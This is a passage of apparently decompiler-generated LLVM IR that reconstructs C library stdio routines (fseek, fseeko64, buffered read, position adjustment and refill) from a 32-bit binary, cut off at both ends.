  %v1_10014ef4 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014ef4 = icmp ult i32 %v2_10014ef0, %v1_10014ef4
  %v4_10014ef4 = icmp eq i32 %v2_10014ef0, %v1_10014ef4
  store i1 %v2_10014ef4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014ef4, i1* %cr7_eq.global-to-local, align 1
  %v0_10014ef8 = load i32, i32* @lr, align 4
  %tmp = icmp ule i32 %v2_10014ef0, %v1_10014ef4
  call void @__pseudo_cond_branch(i1 %tmp, i32 %v0_10014ef8)
  br label %dec_label_pc_10014efc

dec_label_pc_10014efc:                            ; preds = %dec_label_pc_10014ed0, %entry, %dec_label_pc_10014ee4
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10014ef0, { 0, 2, 1 }
  uselistorder i32 %v2_10014ed8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10014ec8, { 2, 1, 0 }
  uselistorder i32 %v2_10014eb0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10014efc, { 2, 0, 1 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10014f04 = load i32, i32* @r5, align 4
  store i32 %v0_10014f04, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_10014f0c = zext i1 %tmp to i32
  %v2_10014f0c = ashr i32 %arg1, 31
  %v3_10014f0c = and i32 %v2_10014f0c, -2
  %v4_10014f0c = or i32 %v3_10014f0c, %v1_10014f0c
  %v3_10014f10 = inttoptr i32 %v4_10014f0c to i16*
  %v4_10014f10 = call i32 @__GI_fseeko64(i16* %v3_10014f10, i32 %arg1, i32 %v0_10014f04)
  ret i32 %v4_10014f10

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10014fa8 = load i32, i32* @r7, align 4
  %v0_10014fac = load i32, i32* @lr, align 4
  store i32 %v0_10014fac, i32* %r0.global-to-local, align 4
  store i32 %v0_10014fa8, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10014fa8, 3
  br i1 %tmp9, label %dec_label_pc_10014fe4, label %dec_label_pc_10014fd0

dec_label_pc_10014fd0:                            ; preds = %entry
  %v0_10014fd0 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10014fdc = inttoptr i32 %v0_10014fd0 to i32*
  store i32 22, i32* %v2_10014fdc, align 4
  br label %dec_label_pc_100150ac

dec_label_pc_10014fe4:                            ; preds = %entry
  %v2_10014fe4 = add i32 %tmp, 52
  %v3_10014fe4 = inttoptr i32 %v2_10014fe4 to i32*
  %v4_10014fe4 = load i32, i32* %v3_10014fe4, align 4
  store i32 %v4_10014fe4, i32* @r28, align 4
  %v3_10014fe8 = icmp eq i32 %v4_10014fe4, 0
  br i1 %v3_10014fe8, label %dec_label_pc_10014ff0, label %dec_label_pc_10015010

dec_label_pc_10014ff0:                            ; preds = %dec_label_pc_10014fe4
  %v2_10014ff0 = add i32 %tmp, 56
  store i32 %v2_10014ff0, i32* @r29, align 4
  %v4_10015004 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 %v2_10014ff0)
  %v0_10015008 = load i32, i32* @r29, align 4
  store i32 268521488, i32* @lr, align 4
  %v1_1001500c = call i32 @pthread_mutex_lock(i32 %v0_10015008)
  %v0_10015010.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015010

dec_label_pc_10015010:                            ; preds = %dec_label_pc_10014fe4, %dec_label_pc_10014ff0
  %v0_1001501c = phi i32 [ %tmp, %dec_label_pc_10014fe4 ], [ %v0_10015010.pre, %dec_label_pc_10014ff0 ]
  %v1_10015010 = inttoptr i32 %v0_1001501c to i16*
  %v2_10015010 = load i16, i16* %v1_10015010, align 2
  %v3_10015010 = zext i16 %v2_10015010 to i32
  store i32 %v3_10015010, i32* %r0.global-to-local, align 4
  %v1_10015014 = and i32 %v3_10015010, 64
  store i32 %v1_10015014, i32* %r9.global-to-local, align 4
  %v3_10015014 = icmp eq i32 %v1_10015014, 0
  br i1 %v3_10015014, label %dec_label_pc_1001502c, label %dec_label_pc_1001501c

dec_label_pc_1001501c:                            ; preds = %dec_label_pc_10015010
  store i32 %v0_1001501c, i32* @r3, align 4
  store i32 268521508, i32* @lr, align 4
  %v0_10015020 = call i32 @__stdio_wcommit()
  %v3_10015024 = icmp eq i32 %v0_10015020, 0
  br i1 %v3_10015024, label %dec_label_pc_1001502c, label %dec_label_pc_10015094

dec_label_pc_1001502c:                            ; preds = %dec_label_pc_1001501c, %dec_label_pc_10015010
  %v0_1001502c = load i32, i32* @r30, align 4
  %v3_1001502c = icmp eq i32 %v0_1001502c, 1
  br i1 %v3_1001502c, label %dec_label_pc_10015034, label %dec_label_pc_1001502c.dec_label_pc_10015048_crit_edge

dec_label_pc_1001502c.dec_label_pc_10015048_crit_edge: ; preds = %dec_label_pc_1001502c
  br label %dec_label_pc_10015048

dec_label_pc_10015034:                            ; preds = %dec_label_pc_1001502c
  %v0_10015034 = load i32, i32* @r31, align 4
  %v1_10015034 = inttoptr i32 %v0_10015034 to i16*
  %v2_10015038 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268521536, i32* @lr, align 4
  %v4_1001503c = call i32 @__stdio_adjust_position(i16* %v1_10015034, i32 %v2_10015038)
  %v1_10015040 = icmp slt i32 %v4_1001503c, 0
  br i1 %v1_10015040, label %dec_label_pc_10015094, label %dec_label_pc_10015034.dec_label_pc_10015048_crit_edge

dec_label_pc_10015034.dec_label_pc_10015048_crit_edge: ; preds = %dec_label_pc_10015034
  %v0_10015048.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10015048

dec_label_pc_10015048:                            ; preds = %dec_label_pc_1001502c.dec_label_pc_10015048_crit_edge, %dec_label_pc_10015034.dec_label_pc_10015048_crit_edge
  %v0_10015048 = phi i32 [ %v0_1001502c, %dec_label_pc_1001502c.dec_label_pc_10015048_crit_edge ], [ %v0_10015048.pre, %dec_label_pc_10015034.dec_label_pc_10015048_crit_edge ]
  %v0_1001504c = load i32, i32* @r31, align 4
  store i32 268521560, i32* @lr, align 4
  %v5_10015054 = call i32 @__stdio_seek(i32 %v0_1001504c, i32* nonnull %stack_var_-56, i32 %v0_10015048)
  %v1_10015058 = icmp slt i32 %v5_10015054, 0
  br i1 %v1_10015058, label %dec_label_pc_10015094, label %dec_label_pc_10015060

dec_label_pc_10015060:                            ; preds = %dec_label_pc_10015048
  %v0_10015060 = load i32, i32* @r31, align 4
  %v1_10015060 = inttoptr i32 %v0_10015060 to i16*
  %v2_10015060 = load i16, i16* %v1_10015060, align 2
  %v3_10015060 = zext i16 %v2_10015060 to i32
  store i32 %v3_10015060, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10015068 = add i32 %v0_10015060, 8
  %v2_10015068 = inttoptr i32 %v1_10015068 to i32*
  %v3_10015068 = load i32, i32* %v2_10015068, align 4
  store i32 %v3_10015068, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_10015070 = and i32 %v3_10015060, 65464
  store i32 %v1_10015070, i32* %r0.global-to-local, align 4
  %v3_10015074 = add i32 %v0_10015060, 2
  %v4_10015074 = inttoptr i32 %v3_10015074 to i8*
  store i8 0, i8* %v4_10015074, align 1
  %v0_10015078 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015078 = load i32, i32* @r31, align 4
  %v2_10015078 = add i32 %v1_10015078, 28
  %v3_10015078 = inttoptr i32 %v2_10015078 to i32*
  store i32 %v0_10015078, i32* %v3_10015078, align 4
  %v0_1001507c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001507c = trunc i32 %v0_1001507c to i16
  %v2_1001507c = load i32, i32* @r31, align 4
  %v3_1001507c = inttoptr i32 %v2_1001507c to i16*
  store i16 %v1_1001507c, i16* %v3_1001507c, align 2
  %v0_10015080 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015080 = load i32, i32* @r31, align 4
  %v2_10015080 = add i32 %v1_10015080, 16
  %v3_10015080 = inttoptr i32 %v2_10015080 to i32*
  store i32 %v0_10015080, i32* %v3_10015080, align 4
  %v0_10015084 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015084 = load i32, i32* @r31, align 4
  %v2_10015084 = add i32 %v1_10015084, 20
  %v3_10015084 = inttoptr i32 %v2_10015084 to i32*
  store i32 %v0_10015084, i32* %v3_10015084, align 4
  %v0_10015088 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015088 = load i32, i32* @r31, align 4
  %v2_10015088 = add i32 %v1_10015088, 24
  %v3_10015088 = inttoptr i32 %v2_10015088 to i32*
  store i32 %v0_10015088, i32* %v3_10015088, align 4
  %v0_1001508c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001508c = load i32, i32* @r31, align 4
  %v2_1001508c = add i32 %v1_1001508c, 44
  %v3_1001508c = inttoptr i32 %v2_1001508c to i32*
  store i32 %v0_1001508c, i32* %v3_1001508c, align 4
  br label %dec_label_pc_10015098

dec_label_pc_10015094:                            ; preds = %dec_label_pc_1001501c, %dec_label_pc_10015048, %dec_label_pc_10015034
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_10015098

dec_label_pc_10015098:                            ; preds = %dec_label_pc_10015060, %dec_label_pc_10015094
  %v0_10015098 = load i32, i32* @r28, align 4
  %v3_10015098 = icmp eq i32 %v0_10015098, 0
  br i1 %v3_10015098, label %dec_label_pc_100150a0, label %dec_label_pc_100150ac

dec_label_pc_100150a0:                            ; preds = %dec_label_pc_10015098
  %v2_100150a0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100150a0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268521644, i32* @lr, align 4
  %v0_100150a8 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_100150ac

dec_label_pc_100150ac:                            ; preds = %dec_label_pc_10015098, %dec_label_pc_10014fd0, %dec_label_pc_100150a0
  store i32 %v0_10014fac, i32* %r0.global-to-local, align 4
  %v0_100150b0 = load i32, i32* @r30, align 4
  ret i32 %v0_100150b0

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 22, { 20, 44, 21, 36, 22, 37, 23, 24, 25, 41, 26, 49, 27, 43, 28, 29, 42, 30, 31, 32, 40, 33, 0, 1, 38, 2, 45, 34, 35, 39, 46, 48, 3, 47, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_100150ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015098, { 1, 0 }
  uselistorder label %dec_label_pc_10015094, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10015048, { 1, 0 }
  uselistorder label %dec_label_pc_10015010, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100150d0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100150dc = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100150e4 = and i16 %v3_100150dc, 4
  %v3_100150e4 = icmp eq i16 %v1_100150e4, 0
  br i1 %v3_100150e4, label %dec_label_pc_100150ec, label %dec_label_pc_10015124

dec_label_pc_100150ec:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_100150f8, label %dec_label_pc_100150f0

dec_label_pc_100150f0:                            ; preds = %dec_label_pc_100150ec
  br label %dec_label_pc_100150f8

dec_label_pc_100150f8:                            ; preds = %dec_label_pc_100150ec, %dec_label_pc_100150f0
  %v1_100150f8 = add i32 %tmp, 4
  %v2_100150f8 = inttoptr i32 %v1_100150f8 to i32*
  %v3_100150f8 = load i32, i32* %v2_100150f8, align 4
  store i32 %v3_100150f8, i32* %r3.global-to-local, align 4
  store i32 268521728, i32* @lr, align 4
  %v1_100150fc = call i32 @__libc_read(i32 %v3_100150f8)
  store i32 %v1_100150fc, i32* %r3.global-to-local, align 4
  %v2_10015100 = icmp sgt i32 %v1_100150fc, 0
  br i1 %v2_10015100, label %dec_label_pc_10015124, label %dec_label_pc_10015108

dec_label_pc_10015108:                            ; preds = %dec_label_pc_100150f8
  %v3_10015100 = icmp eq i32 %v1_100150fc, 0
  %v0_10015108 = load i32, i32* @r31, align 4
  %v1_10015108 = inttoptr i32 %v0_10015108 to i16*
  %v2_10015108 = load i16, i16* %v1_10015108, align 2
  br i1 %v3_10015100, label %dec_label_pc_10015110, label %dec_label_pc_10015118

dec_label_pc_10015110:                            ; preds = %dec_label_pc_10015108
  %v1_10015110 = or i16 %v2_10015108, 4
  br label %dec_label_pc_10015120

dec_label_pc_10015118:                            ; preds = %dec_label_pc_10015108
  %v1_10015118 = or i16 %v2_10015108, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015120

dec_label_pc_10015120:                            ; preds = %dec_label_pc_10015110, %dec_label_pc_10015118
  %v1_10015110.sink.off0 = phi i16 [ %v1_10015110, %dec_label_pc_10015110 ], [ %v1_10015118, %dec_label_pc_10015118 ]
  store i16 %v1_10015110.sink.off0, i16* %v1_10015108, align 2
  %v0_10015134.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015124

dec_label_pc_10015124:                            ; preds = %entry, %dec_label_pc_100150f8, %dec_label_pc_10015120
  %v0_10015134 = phi i32 [ 0, %entry ], [ %v1_100150fc, %dec_label_pc_100150f8 ], [ %v0_10015134.pre, %dec_label_pc_10015120 ]
  store i32 %v0_100150d0, i32* @r31, align 4
  ret i32 %v0_10015134

; uselistorder directives
  uselistorder i16 %v2_10015108, { 1, 0 }
  uselistorder i32 %v1_100150fc, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_10015124, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015120, { 1, 0 }
  uselistorder label %dec_label_pc_100150f8, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  %v3_10015150 = load i16, i16* %arg1, align 2
  %v4_10015150 = zext i16 %v3_10015150 to i32
  %tmp9 = urem i16 %v3_10015150, 4
  %v3_10015154 = icmp eq i16 %tmp9, 0
  br i1 %v3_10015154, label %dec_label_pc_100151a0, label %dec_label_pc_1001515c

dec_label_pc_1001515c:                            ; preds = %entry
  %v1_10015154 = zext i16 %tmp9 to i32
  %v1_1001515c = add nsw i32 %v1_10015154, -1
  store i32 %v1_1001515c, i32* @r10, align 4
  %v4_1001515c = icmp eq i32 %v1_1001515c, 0
  br i1 %v4_1001515c, label %dec_label_pc_100151a0, label %dec_label_pc_10015164

dec_label_pc_10015164:                            ; preds = %dec_label_pc_1001515c
  %v1_10015164 = and i32 %v4_10015150, 2048
  %v3_10015164 = icmp eq i32 %v1_10015164, 0
  br i1 %v3_10015164, label %dec_label_pc_100151a0, label %dec_label_pc_1001516c

dec_label_pc_1001516c:                            ; preds = %dec_label_pc_10015164
  %v2_1001516c = icmp sgt i32 %v1_1001515c, 1
  br i1 %v2_1001516c, label %dec_label_pc_10015218, label %dec_label_pc_10015174

dec_label_pc_10015174:                            ; preds = %dec_label_pc_1001516c
  %v2_10015174 = add i32 %tmp, 40
  %v3_10015174 = inttoptr i32 %v2_10015174 to i32*
  %v4_10015174 = load i32, i32* %v3_10015174, align 4
  %v3_10015178 = icmp eq i32 %v4_10015174, 0
  br i1 %v3_10015178, label %dec_label_pc_10015180, label %dec_label_pc_10015218

dec_label_pc_10015180:                            ; preds = %dec_label_pc_10015174
  %v2_10015180 = add i32 %tmp, 44
  %v3_10015180 = inttoptr i32 %v2_10015180 to i32*
  %v4_10015180 = load i32, i32* %v3_10015180, align 4
  %v2_10015184 = add i32 %tmp, 3
  %v3_10015184 = inttoptr i32 %v2_10015184 to i8*
  %v4_10015184 = load i8, i8* %v3_10015184, align 1
  %v5_10015184 = zext i8 %v4_10015184 to i32
  %v2_1001518c = sub nsw i32 %v1_1001515c, %v5_10015184
  %v1_10015190 = add nsw i32 %v2_1001518c, -1
  %tmp7 = icmp slt i32 %v4_10015180, 1
  br i1 %tmp7, label %dec_label_pc_100151a0, label %dec_label_pc_10015198

dec_label_pc_10015198:                            ; preds = %dec_label_pc_10015180
  %v2_10015198 = add i32 %tmp, 2
  %v3_10015198 = inttoptr i32 %v2_10015198 to i8*
  %v4_10015198 = load i8, i8* %v3_10015198, align 1
  %v5_10015198 = zext i8 %v4_10015198 to i32
  %v2_1001519c = sub nsw i32 %v1_10015190, %v5_10015198
  br label %dec_label_pc_100151a0

dec_label_pc_100151a0:                            ; preds = %dec_label_pc_10015180, %dec_label_pc_10015164, %dec_label_pc_1001515c, %entry, %dec_label_pc_10015198
  %v0_100151c4 = phi i32 [ %v1_10015190, %dec_label_pc_10015180 ], [ %v1_1001515c, %dec_label_pc_10015164 ], [ 0, %dec_label_pc_1001515c ], [ 0, %entry ], [ %v2_1001519c, %dec_label_pc_10015198 ]
  %v1_100151a0 = and i32 %v4_10015150, 64
  %v3_100151a0 = icmp eq i32 %v1_100151a0, 0
  %storemerge.in.in.v = select i1 %v3_100151a0, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_100151b4 = add i32 %tmp, 16
  %v3_100151b4 = inttoptr i32 %v2_100151b4 to i32*
  %v4_100151b4 = load i32, i32* %v3_100151b4, align 4
  %v1_100151b8 = inttoptr i32 %arg2 to i32*
  %v2_100151b8 = load i32, i32* %v1_100151b8, align 4
  store i32 %v2_100151b8, i32* %r4.global-to-local, align 4
  %v2_100151bc = sub i32 %storemerge, %v4_100151b4
  %v1_100151c0 = add i32 %arg2, 4
  %v2_100151c0 = inttoptr i32 %v1_100151c0 to i32*
  %v3_100151c0 = load i32, i32* %v2_100151c0, align 4
  store i32 %v3_100151c0, i32* %r5.global-to-local, align 4
  %v2_100151c4 = add i32 %v2_100151bc, %v0_100151c4
  store i32 %v2_100151c4, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_100151c4, 0
  %v1_100151cc = zext i1 %tmp10 to i32
  %v2_100151cc = ashr i32 %v2_100151c4, 31
  %v3_100151cc = and i32 %v2_100151cc, -2
  %v4_100151cc = or i32 %v3_100151cc, %v1_100151cc
  %v2_100151d0 = sub i32 %v3_100151c0, %v2_100151c4
  %v3_100151d0 = sub i32 -1, %v2_100151c4
  store i32 %v2_100151d0, i32* @r10, align 4
  %v6_100151d0 = icmp ule i32 %v2_100151d0, %v3_100151d0
  %v2_100151d4 = sub nsw i32 -1, %v4_100151cc
  %v3_100151d4 = add i32 %v2_100151b8, %v2_100151d4
  %v5_100151d4 = zext i1 %v6_100151d0 to i32
  %v6_100151d4 = add i32 %v3_100151d4, %v5_100151d4
  store i32 %v6_100151d4, i32* %v1_100151b8, align 4
  %v0_100151dc = load i32, i32* @r10, align 4
  %v1_100151dc = load i32, i32* @r8, align 4
  %v2_100151dc = add i32 %v1_100151dc, 4
  %v3_100151dc = inttoptr i32 %v2_100151dc to i32*
  store i32 %v0_100151dc, i32* %v3_100151dc, align 4
  %v0_100151e0 = load i32, i32* @r8, align 4
  %v1_100151e0 = inttoptr i32 %v0_100151e0 to i32*
  %v2_100151e0 = load i32, i32* %v1_100151e0, align 4
  %v1_100151e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_100151e4 = icmp sgt i32 %v2_100151e0, %v1_100151e4
  br i1 %v3_100151e4, label %dec_label_pc_100151fc, label %dec_label_pc_100151ec

dec_label_pc_100151ec:                            ; preds = %dec_label_pc_100151a0
  %v4_100151e4 = icmp eq i32 %v2_100151e0, %v1_100151e4
  br i1 %v4_100151e4, label %dec_label_pc_100151f0, label %dec_label_pc_10015200thread-pre-split

dec_label_pc_100151f0:                            ; preds = %dec_label_pc_100151ec
  %v1_100151f0 = add i32 %v0_100151e0, 4
  %v2_100151f0 = inttoptr i32 %v1_100151f0 to i32*
  %v3_100151f0 = load i32, i32* %v2_100151f0, align 4
  %v1_100151f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_100151f4 = icmp ugt i32 %v3_100151f0, %v1_100151f4
  br i1 %v3_100151f4, label %dec_label_pc_100151fc, label %dec_label_pc_10015200thread-pre-split

dec_label_pc_100151fc:                            ; preds = %dec_label_pc_100151f0, %dec_label_pc_100151a0
  %v0_100151fc = load i32, i32* %r31.global-to-local, align 4
  %v1_100151fc = sub i32 0, %v0_100151fc
  store i32 %v1_100151fc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10015200

dec_label_pc_10015200thread-pre-split:            ; preds = %dec_label_pc_100151ec, %dec_label_pc_100151f0
  %v0_10015200.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10015200

dec_label_pc_10015200:                            ; preds = %dec_label_pc_10015200thread-pre-split, %dec_label_pc_100151fc
  %v0_10015200 = phi i32 [ %v0_10015200.pr, %dec_label_pc_10015200thread-pre-split ], [ %v1_100151fc, %dec_label_pc_100151fc ]
  %tmp8 = icmp sgt i32 %v0_10015200, -1
  br i1 %tmp8, label %dec_label_pc_1001521c, label %dec_label_pc_10015208

dec_label_pc_10015208:                            ; preds = %dec_label_pc_10015200
  %v0_10015208 = call i32 @__errno_location()
  %v2_10015210 = inttoptr i32 %v0_10015208 to i32*
  store i32 75, i32* %v2_10015210, align 4
  %v0_10015220.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001521c

dec_label_pc_10015218:                            ; preds = %dec_label_pc_10015174, %dec_label_pc_1001516c
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001521c

dec_label_pc_1001521c:                            ; preds = %dec_label_pc_10015200, %dec_label_pc_10015208, %dec_label_pc_10015218
  %v0_10015220 = phi i32 [ %v0_10015200, %dec_label_pc_10015200 ], [ %v0_10015220.pre, %dec_label_pc_10015208 ], [ -1, %dec_label_pc_10015218 ]
  ret i32 %v0_10015220

; uselistorder directives
  uselistorder i32 %v2_100151e0, { 1, 0 }
  uselistorder i32 %v2_100151c4, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 21, 22, 4, 3, 1, 11, 2, 5, 12, 23, 7, 24, 13, 14, 15, 8, 17, 18, 16, 19, 20, 6, 0, 9, 10 }
  uselistorder i32 2048, { 3, 0, 1, 2 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1001521c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015200thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_100151a0, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10015234 = load i32, i32* @lr, align 4
  store i32 %v0_10015234, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10015248 = add i32 %arg1, 8
  %v2_10015248 = inttoptr i32 %v1_10015248 to i32*
  %v3_10015248 = load i32, i32* %v2_10015248, align 4
  %v1_1001524c = add i32 %arg1, 12
  %v2_1001524c = inttoptr i32 %v1_1001524c to i32*
  %v3_1001524c = load i32, i32* %v2_1001524c, align 4
  %v2_10015250 = sub i32 %v3_1001524c, %v3_10015248
  store i32 268522072, i32* @lr, align 4
  %v3_10015254 = inttoptr i32 %v3_10015248 to i16*
  %v4_10015254 = call i32 @__stdio_READ(i16* %v3_10015254, i32 %v2_10015250, i32 %v2_10015250)
  %v0_10015258 = load i32, i32* @r29, align 4
  %v1_10015258 = add i32 %v0_10015258, 8
  %v2_10015258 = inttoptr i32 %v1_10015258 to i32*
  %v3_10015258 = load i32, i32* %v2_10015258, align 4
  %v2_1001525c = add i32 %v3_10015258, %v4_10015254
  store i32 %v2_1001525c, i32* %r0.global-to-local, align 4
  %v2_10015260 = add i32 %v0_10015258, 16
  %v3_10015260 = inttoptr i32 %v2_10015260 to i32*
  store i32 %v3_10015258, i32* %v3_10015260, align 4
  %v0_10015264 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015264 = load i32, i32* @r29, align 4
  %v2_10015264 = add i32 %v1_10015264, 20
  %v3_10015264 = inttoptr i32 %v2_10015264 to i32*
  store i32 %v0_10015264, i32* %v3_10015264, align 4
  store i32 %v0_10015234, i32* %r0.global-to-local, align 4
  ret i32 %v4_10015254

; uselistorder directives
  uselistorder i32 %v3_10015258, { 1, 0 }
  uselistorder i32 %v4_10015254, { 1, 0 }
  uselistorder i32 %v3_10015248, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10015284 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10015290 = load i16, i16* %arg1, align 2
  %v4_10015290 = zext i16 %v3_10015290 to i32
  %v2_10015294 = and i32 %v4_10015290, %arg2
  %v5_10015294 = icmp eq i32 %v2_10015294, 0
  br i1 %v5_10015294, label %dec_label_pc_1001529c, label %dec_label_pc_100152ac

dec_label_pc_1001529c:                            ; preds = %entry
  %v1_1001529c = and i32 %v4_10015290, 2176
  %v3_1001529c = icmp eq i32 %v1_1001529c, 0
  br i1 %v3_1001529c, label %dec_label_pc_100152a4, label %dec_label_pc_100152b8

dec_label_pc_100152a4:                            ; preds = %dec_label_pc_1001529c
  %v2_100152a4 = or i32 %v4_10015290, %arg2
  %v1_100152a8 = trunc i32 %v2_100152a4 to i16
  store i16 %v1_100152a8, i16* %arg1, align 2
  %v0_100152ac.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100152ac

dec_label_pc_100152ac:                            ; preds = %entry, %dec_label_pc_100152a4
  %v0_100152ac = phi i32 [ %tmp, %entry ], [ %v0_100152ac.pre, %dec_label_pc_100152a4 ]
  %v1_100152ac = inttoptr i32 %v0_100152ac to i16*
  %v2_100152ac = load i16, i16* %v1_100152ac, align 2
  %v3_100152ac = zext i16 %v2_100152ac to i32
  %v1_100152b0 = and i32 %v3_100152ac, 16
  %v3_100152b0 = icmp eq i32 %v1_100152b0, 0
  br i1 %v3_100152b0, label %dec_label_pc_100152d4, label %dec_label_pc_100152b8

dec_label_pc_100152b8:                            ; preds = %dec_label_pc_1001529c, %dec_label_pc_100152ac
  %v0_100152b8 = call i32 @__errno_location()
  store i32 %v0_100152b8, i32* %r3.global-to-local, align 4
  %v2_100152c0 = inttoptr i32 %v0_100152b8 to i32*
  store i32 9, i32* %v2_100152c0, align 4
  br label %dec_label_pc_100152c4

dec_label_pc_100152c4:                            ; preds = %dec_label_pc_100152dc, %dec_label_pc_100152b8
  %v0_100152c4 = load i32, i32* @r31, align 4
  %v1_100152c4 = inttoptr i32 %v0_100152c4 to i16*
  %v2_100152c4 = load i16, i16* %v1_100152c4, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100152cc = or i16 %v2_100152c4, 8
  br label %dec_label_pc_10015308

dec_label_pc_100152d4:                            ; preds = %dec_label_pc_100152ac
  %v1_100152d4 = and i32 %v3_100152ac, 64
  %v3_100152d4 = icmp eq i32 %v1_100152d4, 0
  br i1 %v3_100152d4, label %dec_label_pc_100152fc, label %dec_label_pc_100152dc

dec_label_pc_100152dc:                            ; preds = %dec_label_pc_100152d4
  store i32 268522208, i32* @lr, align 4
  %v0_100152dc = call i32 @__stdio_wcommit()
  store i32 %v0_100152dc, i32* %r3.global-to-local, align 4
  %v3_100152e0 = icmp eq i32 %v0_100152dc, 0
  br i1 %v3_100152e0, label %dec_label_pc_100152e8, label %dec_label_pc_100152c4

dec_label_pc_100152e8:                            ; preds = %dec_label_pc_100152dc
  %v0_100152e8 = load i32, i32* @r31, align 4
  %v1_100152e8 = inttoptr i32 %v0_100152e8 to i16*
  %v2_100152e8 = load i16, i16* %v1_100152e8, align 2
